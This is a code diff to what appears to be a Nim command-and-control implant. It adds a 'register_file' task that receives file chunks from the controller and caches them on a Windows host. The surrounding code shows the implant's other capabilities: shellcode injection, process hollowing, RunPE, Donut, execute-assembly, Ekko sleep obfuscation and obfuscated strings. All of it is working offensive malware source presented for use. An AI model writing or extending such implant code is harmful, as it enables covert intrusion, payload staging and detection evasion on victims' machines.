@@ -35,6 +35,7 @@ when defined(windows):
   import tasks/powershell_import
   import tasks/spawn
   import tasks/spawnas
+  import tasks/register_file
 
 when defined(windows):
   when defined(sleepObfuscationEkko):
@@ -42,7 +43,7 @@ when defined(windows):
 
 type
   BackgroundTaskType = enum
-    btDownload, btUpload, btExecuteAssembly, btInlineExecute, btShinject, btDonut, btInjectHollow, btRunPE, btPowershellImport, btSpawn, btSpawnAs
+    btDownload, btUpload, btExecuteAssembly, btInlineExecute, btShinject, btDonut, btInjectHollow, btRunPE, btPowershellImport, btRegisterFile, btSpawn, btSpawnAs
   
   BackgroundTaskState = object
     taskType: BackgroundTaskType
@@ -659,6 +660,19 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           )
           agent.backgroundTasks[taskId] = state
       
+      of obf("register_file"):
+        when defined(windows):
+          var state = BackgroundTaskState(
+            taskType: btRegisterFile,
+            path: "",
+            fileId: params[obf("uuid")].getStr(),
+            totalChunks: 0,
+            currentChunk: 1,
+            fileData: @[],
+            params: params
+          )
+          agent.backgroundTasks[taskId] = state
+      
       else:
         discard
       
@@ -1108,6 +1122,27 @@ proc postResponses*(agent: var Agent) =
                   if importResp.hasKey(obf("completed")) and importResp[obf("completed")].getBool():
                     agent.backgroundTasks.del(taskId)
                     debug "[DEBUG] PowerShell import complete"
+                  else:
+                    state.currentChunk += 1
+                    agent.backgroundTasks[taskId] = state
+            
+            of btRegisterFile:
+              when defined(windows):
+                # Process incoming file chunks for register_file (caching)
+                if taskResp.hasKey(obf("chunk_data")):
+                  let chunkData = taskResp[obf("chunk_data")].getStr()
+                  let totalChunks = taskResp[obf("total_chunks")].getInt()
+                  state.totalChunks = totalChunks
+                  
+                  let cacheResp = processRegisterFileChunk(
+                    taskId, state.params, chunkData, totalChunks,
+                    state.currentChunk, state.fileData
+                  )
+                  agent.taskResponses.add(cacheResp)
+                  
+                  if cacheResp.hasKey(obf("completed")) and cacheResp[obf("completed")].getBool():
+                    agent.backgroundTasks.del(taskId)
+                    debug "[DEBUG] Register file complete"
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
